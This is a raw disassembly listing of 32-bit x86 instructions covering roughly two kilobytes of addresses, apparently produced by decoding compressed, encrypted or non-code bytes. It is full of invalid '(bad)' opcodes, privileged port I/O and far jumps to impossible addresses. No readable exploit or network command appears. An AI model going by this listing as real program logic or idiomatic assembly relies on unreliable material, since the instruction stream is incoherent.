  410277:	adc    eax,DWORD PTR [esi]
  410279:	retf   
  41027a:	test   BYTE PTR [edx-0x39],0xe4
  41027e:	cmp    esi,esp
  410280:	jbe    0x410266
  410282:	in     al,dx
  410283:	or     ebx,DWORD PTR [ebp+eiz*4-0x1b]
  410287:	cmp    esi,ebp
  410289:	jmp    0x4102bd
  41028b:	xchg   esi,eax
  41028c:	sub    edi,eax
  41028e:	dec    ebp
  41028f:	push   edx
  410290:	pop    edi
  410291:	lea    edi,[edi+esi*1]
  410294:	inc    esp
  410295:	or     eax,DWORD PTR [ecx+ecx*4+0x673d323]
  41029c:	dec    ecx
  41029d:	xchg   ebp,eax
  41029e:	mov    dl,0x5c
  4102a0:	inc    edi
  4102a1:	in     eax,dx
  4102a2:	dec    eax
  4102a3:	push   ds
  4102a4:	push   ebx
  4102a5:	call   0x63e6:0xcbdb06d3
  4102ac:	in     eax,dx
  4102ad:	jmp    0x4102ca
  4102af:	mov    cl,0xe
  4102b1:	push   edi
  4102b2:	mov    ds:0x3a775eab,eax
  4102b7:	imul   BYTE PTR [edx+esi*8]
  4102ba:	ins    DWORD PTR es:[edi],dx
  4102bb:	sbb    DWORD PTR [ebp-0x30],edi
  4102be:	in     eax,0xc3
  4102c0:	fsub   DWORD PTR [edi-0xc150055]
  4102c6:	sbb    eax,0x1137e53a
  4102cb:	mov    WORD PTR [ebp-0x4b],ss
  4102ce:	pop    es
  4102cf:	popf   
  4102d0:	lds    edx,FWORD PTR [ebx+0x588c626]
  4102d6:	test   DWORD PTR [esi+0x5d142b25],esp
  4102dc:	push   esi
  4102dd:	pop    ebp
  4102de:	lods   eax,DWORD PTR ds:[esi]
  4102df:	inc    ecx
  4102e0:	push   esi
  4102e1:	js     0x410360
  4102e3:	int3   
  4102e4:	rcr    DWORD PTR ds:0xff9e9391,0x9d
  4102eb:	in     eax,0x67
  4102ed:	inc    edx
  4102ee:	outs   dx,DWORD PTR ds:[esi]
  4102ef:	pop    es
  4102f0:	jb     0x410306
  4102f2:	addr16 int 0xf1
  4102f5:	dec    ebx
  4102f6:	push   esi
  4102f7:	iret   
  4102f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102f9:	xchg   esi,eax
  4102fa:	mov    bh,0x11
  4102fc:	inc    esp
  4102fd:	ffree  st(0)
  4102ff:	mov    dl,0xa2
  410301:	jo     0x41037f
  410303:	stc    
  410304:	and    DWORD PTR [esi],edi
  410306:	aaa    
  410307:	ins    DWORD PTR es:[edi],dx
  410308:	in     eax,dx
  410309:	retf   0x2d54
  41030c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41030d:	or     al,0x90
  41030f:	lods   eax,DWORD PTR ds:[esi]
  410310:	popf   
  410311:	jg     0x410338
  410313:	shl    BYTE PTR [edi+eiz*2+0xd],0xba
  410318:	aaa    
  410319:	loopne 0x41032a
  41031b:	scas   al,BYTE PTR es:[edi]
  41031c:	inc    edi
  41031d:	inc    edi
  41031e:	aas    
  41031f:	loopne 0x41033c
  410321:	xor    ch,BYTE PTR [edx-0x52]
  410324:	test   al,0x60
  410326:	inc    ebp
  410327:	add    BYTE PTR [eax+ecx*1-0x4e8024db],bh
  41032e:	xlat   BYTE PTR ds:[ebx]
  41032f:	(bad)  
  410330:	mov    cl,0x79
  410332:	mov    esp,0x8203e17b
  410337:	icebp  
  410338:	ficom  DWORD PTR [eax+0x6b]
  41033b:	test   al,0xc9
  41033d:	add    al,0x1c
  41033f:	push   edx
  410340:	pop    ebp
  410341:	sbb    esp,eax
  410343:	push   es
  410344:	xor    edx,DWORD PTR [eax+0x3f1a87f4]
  41034a:	inc    ebp
  41034b:	sbb    al,0xf4
  41034d:	jg     0x4102d2
  41034f:	arpl   WORD PTR [ecx-0x1218bb18],cx
  410355:	add    BYTE PTR [edx+0x7],bh
  410358:	out    0xbd,al
  41035a:	jae    0x4102e3
  41035c:	mov    ebx,0xd022de69
  410361:	aam    0x78
  410363:	mov    DWORD PTR [edi-0x25faf051],edx
  410369:	mov    ah,0x80
  41036b:	adc    edx,0x61
  41036e:	out    dx,eax
  41036f:	fldenv [edx-0x4352b7eb]
  410375:	sbb    bh,BYTE PTR [ebx+0x60]
  410378:	and    al,0xff
  41037a:	lods   eax,DWORD PTR ds:[esi]
  41037b:	lahf   
  41037c:	leave  
  41037d:	cmp    BYTE PTR ds:0xdac2ac98,0xae
  410384:	(bad)  
  410386:	rcl    DWORD PTR [edi-0x6a],cl
  410389:	pop    eax
  41038a:	add    DWORD PTR [ecx],0x97faa44b
  410390:	sub    eax,0x19db5152
  410395:	mov    bl,0xea
  410397:	repnz int 0xc
  41039a:	mov    ebp,0xf531a83d
  41039f:	aam    0x33
  4103a1:	dec    DWORD PTR [eax-0x29]
  4103a4:	pop    esp
  4103a5:	pop    ecx
  4103a6:	mov    ch,0x7b
  4103a8:	inc    eax
  4103a9:	mov    ebx,0xe4860b26
  4103ae:	xchg   edi,esp
  4103b0:	(bad)  
  4103b1:	int3   
  4103b2:	pop    ecx
  4103b3:	out    0x6b,al
  4103b5:	in     al,dx
  4103b6:	lds    ebp,FWORD PTR [ebp+0x5a2f279]
  4103bc:	icebp  
  4103bd:	fwait
  4103be:	iret   
  4103bf:	cmc    
  4103c0:	pop    eax
  4103c1:	push   ebp
  4103c2:	xchg   ebx,eax
  4103c3:	jl     0x410358
  4103c5:	out    0x85,al
  4103c7:	push   ebp
  4103c8:	push   ds
  4103c9:	mov    ch,BYTE PTR ds:0x53e8173e
  4103cf:	pop    eax
  4103d0:	xchg   ebp,eax
  4103d1:	sbb    BYTE PTR [eax],bl
  4103d3:	push   edi
  4103d4:	pop    edi
  4103d5:	pop    esp
  4103d6:	add    esi,ebx
  4103d8:	xor    eax,esp
  4103da:	jl     0x410361
  4103dc:	pop    ebp
  4103dd:	cmp    ch,BYTE PTR [edx+0xf]
  4103e0:	(bad)  
  4103e1:	jo     0x410363
  4103e3:	scas   al,BYTE PTR es:[edi]
  4103e4:	mov    BYTE PTR [ebx+0x7d],bl
  4103e7:	push   ebp
  4103e8:	sbb    al,0xe0
  4103ea:	shl    DWORD PTR [eax],0xfd
  4103ed:	mov    WORD PTR [ebp+0xfa9733b],ds
  4103f3:	jae    0x41045c
  4103f5:	mov    al,0xdd
  4103f7:	fidivr DWORD PTR [eax+0x6c0cf21f]
  4103fd:	js     0x410447
  4103ff:	sbb    dh,BYTE PTR [ecx-0x16]
  410402:	in     eax,dx
  410403:	sub    esi,DWORD PTR [esi+0x78f25445]
  410409:	jmp    0xed1df574
  41040e:	inc    esp
  41040f:	cmp    al,0xe0
  410411:	add    ah,bl
  410413:	inc    edi
  410414:	cmp    ebx,DWORD PTR [ecx-0x7170e812]
  41041a:	pop    ebx
  41041b:	cwde   
  41041c:	(bad)  
  41041d:	mov    esp,0x3230737b
  410422:	jle    0x41049e
  410424:	mov    ds:0x1908cb0a,al
  410429:	out    0xc8,eax
  41042b:	retf   
  41042c:	and    DWORD PTR [ebp-0xd],ecx
  41042f:	in     al,dx
  410430:	std    
  410431:	fucomp st(3)
  410433:	imul   esi,DWORD PTR [ecx+0x17],0xe47f6982
  41043a:	mov    edx,0x6aca5d6b
  41043f:	imul   edi,esp,0x26114519
  410445:	scas   al,BYTE PTR es:[edi]
  410446:	adc    DWORD PTR [edi-0x6b124665],ebx
  41044c:	aaa    
  41044d:	cmp    dl,BYTE PTR [ecx]
  41044f:	stos   DWORD PTR es:[edi],eax
  410450:	pop    ecx
  410451:	mov    al,ds:0x121b48c6
  410456:	push   cs
  410457:	or     bh,BYTE PTR [ecx+0x75f5baf3]
  41045d:	dec    esp
  41045e:	jo     0x410429
  410460:	(bad)  
  410461:	repz pop edi
  410463:	inc    ebx
  410464:	xchg   BYTE PTR [eax-0x44a3d1f8],bh
  41046a:	mov    dh,0xba
  41046c:	rcl    bl,cl
  41046e:	fmul   QWORD PTR [eax+0x38674b70]
  410474:	aad    0x14
  410476:	nop
  410477:	xchg   edi,eax
  410478:	xor    eax,0xfd568e4f
  41047d:	or     ah,cl
  41047f:	sub    DWORD PTR [ebx-0x79908f73],ebx
  410485:	push   eax
  410486:	inc    ebx
  410487:	arpl   sp,dx
  410489:	icebp  
  41048a:	das    
  41048b:	push   ecx
  41048c:	push   ds
  41048d:	mov    WORD PTR [eax],?
  41048f:	shr    DWORD PTR [ecx],1
  410491:	mov    es,WORD PTR [esi]
  410493:	std    
  410494:	jl     0x410490
  410496:	push   ecx
  410497:	jg     0x410486
  410499:	call   0x555f2225
  41049e:	push   ebp
  41049f:	xchg   DWORD PTR [ecx+0x4e75ac2c],edx
  4104a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104a6:	pop    ecx
  4104a7:	cdq    
  4104a8:	enter  0xbea,0x1f
  4104ac:	stos   BYTE PTR es:[edi],al
  4104ad:	or     dh,BYTE PTR fs:[edi]
  4104b0:	test   DWORD PTR [ebx+0x7a],ecx
  4104b3:	es and al,0xdd
  4104b6:	xor    DWORD PTR [edi-0x3a875eb9],ebp
  4104bc:	icebp  
  4104bd:	sbb    DWORD PTR [edx-0x4601d330],ebp
  4104c3:	mov    dl,BYTE PTR [edx]
  4104c5:	add    al,0x3d
  4104c7:	pop    ss
  4104c8:	fwait
  4104c9:	sar    DWORD PTR [ebx-0x5c475e5f],cl
  4104cf:	clc    
  4104d0:	mov    ds:0x10411747,eax
  4104d5:	leave  
  4104d6:	dec    esp
  4104d7:	mov    al,ds:0x55279740
  4104dc:	xchg   BYTE PTR [eax],al
  4104de:	and    DWORD PTR [eax],edi
  4104e0:	push   eax
  4104e1:	(bad)  
  4104e2:	adc    ah,cl
  4104e4:	popa   
  4104e5:	jmp    0x410546
  4104e7:	sub    al,0xa1
  4104e9:	mov    BYTE PTR [eax+0x1b],al
  4104ec:	mov    ebx,ecx
  4104ee:	(bad)  
  4104ef:	std    
  4104f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104f1:	xor    ch,BYTE PTR [ebx]
  4104f3:	ds out dx,eax
  4104f5:	push   ds
  4104f6:	jno    0x41055c
  4104f8:	xchg   sp,ax
  4104fa:	iret   
  4104fb:	fs xor eax,0x3582f87b
  410501:	or     dh,BYTE PTR [edi+0x68c2acf4]
  410507:	jle    0x4104ff
  410509:	xchg   bl,dh
  41050b:	mov    esi,0x888fc499
  410510:	cmp    cl,BYTE PTR [esi]
  410512:	enter  0xb82d,0x3d
  410516:	jae    0x410512
  410518:	ficom  WORD PTR [edx+edx*8]
  41051b:	int    0x91
  41051d:	inc    esp
  41051e:	mov    eax,esp
  410520:	xor    DWORD PTR [ebx],eax
  410522:	jmp    DWORD PTR [edi+0x26]
  410525:	cmc    
  410526:	xchg   esi,eax
  410527:	push   ebp
  410528:	(bad)  
  410529:	stos   BYTE PTR es:[edi],al
  41052a:	jmp    0x18f0ec7e
  41052f:	lea    esi,[edx+0x7b030d27]
  410535:	dec    ebx
  410536:	iret   
  410537:	jmp    0x4104f1
  410539:	pop    ebx
  41053a:	scas   eax,DWORD PTR es:[edi]
  41053b:	bnd jne 0x4104e4
  41053e:	cdq    
  41053f:	pop    ds
  410540:	xchg   edx,eax
  410541:	cmp    al,0x7d
  410543:	or     DWORD PTR [eax+0x577d3623],0xc5280416
  41054d:	sbb    al,0xad
  41054f:	and    eax,0x8d8caaa1
  410554:	cld    
  410555:	jno    0x4105d1
  410557:	in     al,dx
  410558:	xchg   esi,eax
  410559:	add    eax,0x12d1f16c
  41055e:	aam    0xd4
  410560:	cmp    bl,ah
  410562:	cs pop esi
  410564:	add    esi,esp
  410566:	popf   
  410567:	lods   al,BYTE PTR ds:[esi]
  410568:	adc    eax,0xd651bdb
  41056d:	test   BYTE PTR [ebx],dl
  41056f:	fadd   st(2),st
  410571:	push   ebp
  410572:	sbb    esp,edi
  410574:	xor    eax,0x2cae3610
  410579:	in     al,dx
  41057a:	(bad)  [esi-0x7e]
  41057d:	js     0x4105d9
  41057f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410580:	sti    
  410581:	clc    
  410582:	dec    esp
  410583:	test   edi,esp
  410585:	inc    ecx
  410586:	fstp   DWORD PTR [ecx+0x5b5f0487]
  41058c:	adc    BYTE PTR [ebp+0x3e],ah
  41058f:	or     al,0xa1
  410591:	jecxz  0x410556
  410593:	clc    
  410594:	mov    esi,0x7e370bb5
  410599:	jge    0x4105aa
  41059b:	cs push esi
  41059d:	je     0x41056a
  41059f:	inc    ebp
  4105a0:	sub    BYTE PTR [eax+edx*4-0x46],dl
  4105a4:	sub    edi,esi
  4105a6:	cs pop ss
  4105a8:	or     BYTE PTR [esp+edx*2-0x7e],0x2
  4105ad:	ins    DWORD PTR es:[edi],dx
  4105ae:	lods   eax,DWORD PTR ds:[esi]
  4105af:	test   BYTE PTR [esi],ah
  4105b1:	inc    ebp
  4105b2:	cmp    eax,eax
  4105b4:	bswap  edx
  4105b6:	jp     0x41053b
  4105b8:	enter  0x4528,0xf
  4105bc:	ficom  DWORD PTR [ebp+0x5c]
  4105bf:	inc    ebx
  4105c0:	mov    ecx,0x6c64fc84
  4105c5:	fisubr WORD PTR [edi+0x66f1c808]
  4105cb:	jno    0x4105fa
  4105cd:	shl    DWORD PTR [edx+0x54],cl
  4105d0:	add    dl,BYTE PTR [ecx]
  4105d2:	int3   
  4105d3:	xchg   DWORD PTR [edx+ecx*2],ebx
  4105d6:	adc    eax,0x36738f02
  4105db:	ja     0x410631
  4105dd:	or     DWORD PTR ds:0x350c47f0,eax
  4105e3:	push   ss
  4105e4:	inc    eax
  4105e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105e6:	stos   BYTE PTR es:[edi],al
  4105e7:	mov    eax,0xb24032de
  4105ec:	fld    QWORD PTR ds:0x58c19edc
  4105f3:	push   edi
  4105f4:	loopne 0x4105df
  4105f6:	mov    ds,WORD PTR [ecx]
  4105f8:	add    esi,DWORD PTR [ebx-0x219a1acd]
  4105fe:	inc    edx
  4105ff:	not    BYTE PTR [edx+0x61]
  410602:	mov    al,ds:0xef6e2fdd
  410607:	bound  esp,QWORD PTR [ebx]
  410609:	aam    0x8
  41060b:	push   eax
  41060c:	mov    BYTE PTR [edx+0x45],ah
  41060f:	xor    al,0x6e
  410611:	sti    
  410612:	pop    ds
  410613:	fs push edx
  410615:	sub    eax,0xa052c20
  41061a:	ret    0xdc2c
  41061d:	push   ebp
  41061e:	or     eax,0xcb74923d
  410623:	cmp    BYTE PTR [eax-0x1adfd577],al
  410629:	sbb    eax,0xe91c986a
  41062e:	stc    
  41062f:	dec    edi
  410630:	bound  eax,QWORD PTR cs:[bp+di-0x72bb]
  410636:	cmp    BYTE PTR [eax],bl
  410638:	daa    
  410639:	imul   ebp,DWORD PTR [edi],0x70
  41063c:	in     al,0x30
  41063e:	stos   BYTE PTR es:[edi],al
  41063f:	mov    ah,0xfb
  410641:	pop    ebp
  410642:	xor    eax,DWORD PTR [esp+edi*4+0x5491b23c]
  410649:	and    ecx,DWORD PTR [ebp+0x3e]
  41064c:	cwde   
  41064d:	cmp    eax,0x8905ef4d
  410652:	add    eax,0xcb32e344
  410657:	ret    
  410658:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410659:	ss fpatan 
  41065c:	nop
  41065d:	sahf   
  41065e:	movlhps xmm0,xmm7
  410661:	dec    ebp
  410662:	jmp    0xdb226fd3
  410667:	ror    DWORD PTR [edi],1
  410669:	pushf  
  41066a:	pusha  
  41066b:	pop    ebx
  41066c:	add    dh,ah
  41066e:	push   ebp
  41066f:	rol    DWORD PTR [esi],cl
  410671:	repz jge 0x4106f1
  410674:	fcmovnbe st,st(3)
  410676:	mov    ch,0x44
  410678:	retf   0x7f51
  41067b:	jns    0x4106a0
  41067d:	aam    0x47
  41067f:	and    edi,DWORD PTR [edx+0x1e]
  410682:	sti    
  410683:	or     BYTE PTR [ebp+0x1a],bh
  410686:	pop    ds
  410687:	xchg   edx,eax
  410688:	popf   
  410689:	loopne 0x410686
  41068b:	es jbe 0x410661
  41068e:	je     0x410674
  410690:	cwde   
  410691:	pushf  
  410692:	inc    esp
  410693:	xchg   ebx,eax
  410694:	jp     0x41069b
  410696:	call   0xbde6:0x4aca4759
  41069d:	sbb    cl,dl
  41069f:	mov    al,gs:0xfdd5fe74
  4106a5:	xchg   DWORD PTR [ebx+edx*2+0x626975de],eax
  4106ac:	call   0x1802:0xb137d880
  4106b3:	mov    ch,0x6
  4106b5:	mov    edi,0x670a9032
  4106ba:	add    eax,0xc3bbc47
  4106bf:	or     eax,0xb25deff
  4106c4:	pop    ss
  4106c5:	popa   
  4106c6:	ret    0x97f5
  4106c9:	push   ecx
  4106ca:	in     al,0x4d
  4106cc:	jns    0x4106ad
  4106ce:	pop    esp
  4106cf:	cmp    edx,DWORD PTR [esp+ecx*8+0x2]
  4106d3:	sub    DWORD PTR [edi-0x4ca4ea0d],ebp
  4106d9:	sub    esp,DWORD PTR [esi+ebx*4-0x2e]
  4106dd:	sbb    eax,0x3f996f66
  4106e2:	(bad)  
  4106e3:	mov    BYTE PTR [eax+0x226396d3],ch
  4106e9:	ret    0x28ba
  4106ec:	into   
  4106ed:	cdq    
  4106ee:	or     bh,al
  4106f0:	add    edx,esp
  4106f2:	sub    edi,edx
  4106f4:	loope  0x410739
  4106f6:	aad    0xea
  4106f8:	mov    ebp,0x9ce5bf94
  4106fd:	daa    
  4106fe:	push   eax
  4106ff:	imul   edi,ebx,0xca740918
  410705:	mov    ds:0xbdd0af59,al
  41070a:	jo     0x41078a
  41070c:	xor    eax,0xef732081
  410711:	imul   ebp,DWORD PTR [esi-0x7f],0xffffff86
  410715:	scas   al,BYTE PTR es:[edi]
  410716:	sub    DWORD PTR [esi+0x73f36e44],ecx
  41071c:	xchg   edi,eax
  41071d:	xchg   esp,eax
  41071e:	loopne 0x41077a
  410720:	xor    edx,DWORD PTR ds:0x622a3854
  410726:	push   edi
  410727:	sub    DWORD PTR cs:[ebx-0x6a472c8],edi
  41072e:	inc    ebp
  41072f:	repz call 0xd9d0:0x9db83dca
  410737:	jne    0x41078c
  410739:	pop    edx
  41073a:	jo     0x410718
  41073c:	mov    ebp,0xe0f9a26e
  410741:	iret   
  410742:	mov    ds:0xd847e3ca,eax
  410747:	inc    ebp
  410748:	(bad)  
  41074a:	jo     0x410741
  41074c:	pop    esi
  41074d:	inc    ecx
  41074e:	inc    eax
  41074f:	sbb    ah,BYTE PTR [edi+0x45]
  410752:	retf   0x4260
  410755:	sub    esi,esi
  410757:	mov    esp,0xaec3dae2
  41075c:	ror    dh,0x22
  41075f:	mov    esp,0x959802a6
  410764:	mov    eax,ds:0x11066a71
  410769:	dec    esp
  41076a:	fmul   DWORD PTR ds:0xb06d4670
  410770:	adc    eax,0x58ec3342
  410775:	sub    dl,BYTE PTR [ebp+0x4]
  410778:	jae    0x41071f
  41077a:	ret    
  41077b:	in     eax,0x36
  41077d:	lods   al,BYTE PTR ds:[esi]
  41077e:	mov    WORD PTR [ecx+0x564a9285],cs
  410784:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410785:	aaa    
  410786:	adc    edx,esi
  410788:	mov    edi,0x4272e1df
  41078d:	leave  
  41078e:	cmp    eax,ebx
  410790:	ror    BYTE PTR [edx],0x27
  410793:	jg     0x410726
  410795:	pop    edi
  410796:	outs   dx,BYTE PTR ds:[esi]
  410797:	pushf  
  410798:	arpl   WORD PTR [ebx+eiz*2+0x5c5902c4],di
  41079f:	rol    dl,0xc9
  4107a2:	xor    esi,esi
  4107a4:	add    cl,BYTE PTR [ecx-0x4d]
  4107a7:	mov    dh,0x2d
  4107a9:	scas   eax,DWORD PTR es:[edi]
  4107aa:	sbb    dh,BYTE PTR [edx-0x753cefac]
  4107b0:	inc    eax
  4107b1:	add    esi,ebx
  4107b3:	lds    esi,FWORD PTR [ebx-0x54]
  4107b6:	hlt    
  4107b7:	jnp    0x4107b4
  4107b9:	lods   eax,DWORD PTR ds:[esi]
  4107ba:	inc    esi
  4107bb:	test   BYTE PTR [edi+eiz*8-0x2f],cl
  4107bf:	jg     0x410771
  4107c1:	mov    eax,ds:0xbdf90ddd
  4107c6:	icebp  
  4107c7:	nop
  4107c8:	out    0x22,eax
  4107ca:	jo     0x4107ab
  4107cc:	stos   DWORD PTR es:[edi],eax
  4107cd:	sar    DWORD PTR [edx+0xe],1
  4107d0:	fwait
  4107d1:	dec    ebx
  4107d2:	es jecxz 0x41084c
  4107d5:	in     eax,dx
  4107d6:	fstp   DWORD PTR [esi]
  4107d8:	cdq    
  4107d9:	and    esp,edx
  4107db:	outs   dx,DWORD PTR ds:[esi]
  4107dc:	inc    esp
  4107dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107de:	sar    BYTE PTR [edi],cl
  4107e0:	mov    edi,0x94f5be77
  4107e5:	in     al,dx
  4107e6:	stos   BYTE PTR es:[edi],al
  4107e7:	jb     0x410786
  4107e9:	adc    al,0xb9
  4107eb:	xchg   esp,eax
  4107ec:	addr16 jnp 0x410856
  4107ef:	(bad)  [edi+0x858d4a1]
  4107f5:	es (bad) 
  4107f8:	jmp    0x410809
  4107fa:	ret    0xf6cf
  4107fd:	adc    eax,DWORD PTR [esi+0x7e8fce24]
  410803:	call   0xabc1c615
  410808:	popa   
  410809:	mov    al,BYTE PTR [edx+0x2f8203cd]
  41080f:	(bad)  
  410810:	retf   0x48d8
  410813:	cmp    dh,BYTE PTR [eax+eax*8]
  410816:	dec    esi
  410817:	pop    ecx
  410818:	cld    
  410819:	mov    WORD PTR [edx],gs
  41081b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41081c:	and    DWORD PTR [eax+0x24],edx
  41081f:	ins    DWORD PTR es:[edi],dx
  410820:	xchg   esi,eax
  410821:	push   esp
  410822:	in     eax,dx
  410823:	cmp    eax,eax
  410825:	arpl   WORD PTR [esi+0x45],di
  410828:	dec    ebx
  410829:	or     BYTE PTR [ecx+0x4a26fd2a],bh
  41082f:	test   dl,bl
  410831:	xchg   ebx,eax
  410832:	mov    ch,0x64
  410834:	cmp    esp,eax
  410836:	push   esi
  410837:	inc    esi
  410838:	sbb    al,0x77
  41083a:	and    DWORD PTR [ebp+0x180ee891],0x782d18d8
  410844:	mov    edi,0xf06a90dd
  410849:	scas   eax,DWORD PTR es:[edi]
  41084a:	test   DWORD PTR [esi+edx*1+0x7a5def29],0xda10c3b8
  410855:	ret    0x771a
  410858:	add    DWORD PTR [ebx],edi
  41085a:	cs push 0xffffffce
  41085d:	adc    BYTE PTR [edx],al
  41085f:	pop    ebx
  410860:	sbb    ebp,ebx
  410862:	mov    ?,esi
  410864:	outs   dx,BYTE PTR ds:[esi]
  410865:	jno    0x410873
  410867:	inc    ebp
  410868:	cmp    eax,0x2b91e443
  41086d:	(bad)  
  41086e:	scas   eax,DWORD PTR es:[edi]
  41086f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410870:	gs mov ah,0x1e
  410873:	push   ecx
  410874:	push   cs
  410875:	repz cmps DWORD PTR cs:[esi],DWORD PTR es:[edi]
  410878:	cmp    ebp,DWORD PTR [ecx]
  41087a:	repz bound esi,QWORD PTR [ecx+0xa]
  41087e:	jae    0x4108d3
  410880:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410881:	std    
  410882:	mov    ?,WORD PTR [edx]
  410884:	pop    ecx
  410885:	lods   eax,DWORD PTR ds:[esi]
  410886:	call   FWORD PTR [edx]
  410888:	xchg   edi,eax
  410889:	dec    esp
  41088a:	dec    BYTE PTR [edi+0x5de38b83]
  410890:	popa   
  410891:	cmp    eax,DWORD PTR [ecx]
  410893:	adc    DWORD PTR [ebx-0x2c1e0488],0xaa5c7394
  41089d:	clc    
  41089e:	imul   ebx,DWORD PTR [ebp-0x72],0x57
  4108a2:	pop    esp
  4108a3:	mov    esi,0xc11586ab
  4108a8:	cld    
  4108a9:	in     al,0x83
  4108ab:	sbb    eax,0x44ee91ba
  4108b0:	xchg   BYTE PTR [edi+0x66],ah
  4108b3:	aad    0x8c
  4108b5:	stos   DWORD PTR es:[edi],eax
  4108b6:	jo     0x410885
  4108b8:	rcr    ecx,cl
  4108ba:	mov    BYTE PTR [ecx-0x5],dh
  4108bd:	or     eax,0x6b0f1124
  4108c2:	push   ebp
  4108c3:	dec    esi
  4108c4:	sub    al,0x64
  4108c6:	dec    eax
  4108c7:	outs   dx,BYTE PTR ds:[esi]
  4108c8:	inc    esi
  4108c9:	mov    edi,0xf217832
  4108ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108cf:	leave  
  4108d0:	jmp    0x29fd:0x92b938e9
  4108d7:	das    
  4108d8:	pop    edx
  4108d9:	and    BYTE PTR [edx-0x3a],cl
  4108dc:	imul   edi,edi,0xffffffc1
  4108df:	inc    edi
  4108e0:	aaa    
  4108e1:	(bad)  
  4108e2:	das    
  4108e3:	xchg   ebp,eax
  4108e4:	repnz (bad) 
  4108e7:	jns    0x4108f8
  4108e9:	jge    0x4108a4
  4108eb:	test   DWORD PTR [eax],ebx
  4108ed:	inc    edx
  4108ee:	or     bh,BYTE PTR [ecx+0x18d91863]
  4108f4:	icebp  
  4108f5:	jg     0x41094a
  4108f7:	add    bh,cl
  4108f9:	jmp    0xb565bee6
  4108fe:	inc    eax
  4108ff:	icebp  
  410900:	repz (bad) 
  410902:	pop    esp
  410903:	sar    BYTE PTR [edx-0x7a],cl
  410906:	fisub  WORD PTR [esi+eax*1+0x66e32d62]
  41090d:	in     eax,0xd
  41090f:	pusha  
  410910:	add    DWORD PTR ds:[ebp+0x31ed1d41],ebp
  410917:	xor    BYTE PTR [ecx],dh
  410919:	in     al,dx
  41091a:	sbb    al,0x31
  41091c:	popa   
  41091d:	outs   dx,BYTE PTR ds:[esi]
  41091e:	cld    
  41091f:	outs   dx,DWORD PTR ds:[esi]
  410920:	push   eax
  410921:	mov    ds:0x227dcc88,eax
  410926:	jnp    0x410964
  410928:	dec    edx
  410929:	test   eax,0xb68dfd0c
  41092e:	nop
  41092f:	cmp    ch,ch
  410931:	mov    BYTE PTR [ecx],cl
  410933:	test   al,0xf0
  410935:	ss dec ebx
  410937:	inc    ecx
  410938:	mov    DWORD PTR [esi+0x4a5a0be3],0xb070a5da
  410942:	mov    esp,DWORD PTR [edx+0x1f]
  410945:	mov    eax,0xef0b7d5b
  41094a:	xchg   edx,eax
  41094b:	sub    DWORD PTR [ebp*2-0x111b6b60],esi
  410952:	xor    BYTE PTR [ecx-0x67],0xbf
  410956:	sar    BYTE PTR [eax+0x58],cl
  410959:	push   ebx
  41095a:	aam    0x50
  41095c:	(bad)  
  41095d:	lahf   
  41095e:	jp     0x410943
  410960:	repz mov eax,0x7a154461
  410966:	push   esp
  410967:	mov    cl,0xc7
  410969:	(bad)  [esi]
  41096b:	add    DWORD PTR [ebp-0x27],0x49
  41096f:	fsub   DWORD PTR [bp+di+0x2c]
  410973:	jg     0x4108f5
  410975:	ja     0x410964
  410977:	xchg   esi,eax
  410978:	push   edi
  410979:	inc    eax
  41097a:	mov    DWORD PTR [esi-0x5e],0x8415a529
  410981:	push   ss
  410982:	fist   WORD PTR [ebp+0x1c9cff92]
  410988:	and    DWORD PTR [ebp+0x739bbf9b],eax
  41098e:	cmc    
  41098f:	add    ecx,DWORD PTR [ecx]
  410991:	push   edx
  410992:	icebp  
  410993:	dec    edx
  410994:	in     eax,0x61
  410996:	dec    ecx
  410997:	xlat   BYTE PTR ds:[ebx]
  410998:	mov    ah,0xec
  41099a:	ret    
  41099b:	loope  0x4109c0
  41099d:	pusha  
  41099e:	xor    dh,BYTE PTR [ebx+esi*8+0x279762d6]
  4109a5:	pop    ebx
  4109a6:	fwait
  4109a7:	mov    ecx,0xbf45a48f
  4109ac:	cmp    esp,DWORD PTR [edx-0x7c]
  4109af:	js     0x410955
  4109b1:	imul   edx,ecx,0xc3b93b8d
  4109b7:	icebp  
  4109b8:	xchg   ebp,eax
  4109b9:	iret   
  4109ba:	fistp  WORD PTR [ebp+0x66]
  4109bd:	dec    ch
  4109bf:	push   edx
  4109c0:	pop    ecx
  4109c1:	stos   DWORD PTR es:[edi],eax
  4109c2:	ins    BYTE PTR es:[edi],dx
  4109c3:	sbb    DWORD PTR [ebp+0x19e3b1c4],0xffffffa6
  4109ca:	sub    DWORD PTR [ebx+eax*4],ebx
  4109cd:	dec    ecx
  4109ce:	jbe    0x4109bd
  4109d0:	cld    
  4109d1:	xlat   BYTE PTR ds:[ebx]
  4109d2:	or     BYTE PTR [eax+0x33],dh
  4109d5:	sbb    al,0xce
  4109d7:	arpl   ax,bp
  4109d9:	pop    esp
  4109da:	or     al,0x96
  4109dc:	push   ebp
  4109dd:	jb     0x410a02
  4109df:	add    al,0x25
  4109e1:	push   esi
  4109e2:	inc    ebp
  4109e3:	inc    ebp
  4109e4:	jno    0x410a49
  4109e6:	nop
  4109e7:	add    eax,eax
  4109e9:	inc    edx
  4109ea:	sub    eax,DWORD PTR [eax+0x1b]
  4109ed:	sbb    DWORD PTR [ebx+edx*4],eax
  4109f0:	out    dx,al
  4109f1:	and    edx,DWORD PTR [edi+0x29]
  4109f4:	rcl    BYTE PTR [edi],0x22
  4109f7:	mov    esi,0xcb0c828b
  4109fc:	push   esi
  4109fd:	jb     0x41098b
  4109ff:	mov    edi,es
  410a01:	lds    ecx,FWORD PTR [ebx+0x39]
  410a04:	push   ebp
  410a05:	mov    ebp,0xb88e9ed2
  410a0a:	mov    cl,dh
  410a0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a0d:	add    ah,BYTE PTR [ecx+eax*2+0x66bbf6fc]
  410a14:	cdq    
  410a15:	jg     0x4109c9
